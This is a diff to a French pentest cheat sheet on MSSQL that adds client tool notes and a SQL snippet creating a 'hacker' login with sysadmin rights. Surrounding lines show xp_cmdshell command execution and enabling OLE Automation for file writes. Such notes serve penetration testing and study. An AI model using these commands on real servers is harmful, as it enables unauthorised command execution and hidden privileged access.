@@ -85,6 +85,9 @@ SELECT table_name FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
 ## Outils utiles
 
 #### sqlcmd (Windows)
+
+Utilitaire installer avec SQLServer
+Il faudra ajouter le mot clé `GO` à chaque requête afin qu'elle soit exécutée.
 ```
 # -y 30 -Y 30 augmentent la visibilité des résultat (attention aux performances)
 sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
@@ -93,6 +96,10 @@ sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 ```
 
 #### sqsh (Linux)
+
+Equivalent de sqlcmd sous Windows, pour Linux.
+Comme sous windows, on ajoutera le mot clé `GO` à chaque requête afin qu'elle soit exécutée.
+
 ```
 # Authentificatino Interne (SQL Server)
 sqsh -S $TARGET_IP -U $AD_USER -P $AD_PASSWORD
@@ -102,6 +109,9 @@ sqsh -S $TARGET_IP -U .\\$AD_USER -P $AD_PASSWORD
 ```
 
 #### Mssqlclient.py (impacket)
+
+**Attention** : ce client n'accepte pas les requêtes sur plusieurs lignes.
+
 ```sql
 -- Internal Authentication (no fomzin prefix)
 mssqlclient.py -p 1433  $USER:$PASS@$TARGET_IP 
@@ -136,10 +146,18 @@ xp_cmdshell 'whoami';
 
 ```
 
+#### Création de compte
+```sql
+------------------------------------------------------------------------
+-- Create user with sysadmin privs
+CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
+EXEC sp_addsrvrolemember 'hacker', 'sysadmin';
+```
+
 #### Ecriture dans un fichier
 ```
 ------------------------------------------------------------------------
--- Creation de fichier fia OLE Automation Procedures
+-- Creation de fichier via OLE Automation Procedures
 -- Activation
 1> sp_configure 'show advanced options', 1
 2> GO
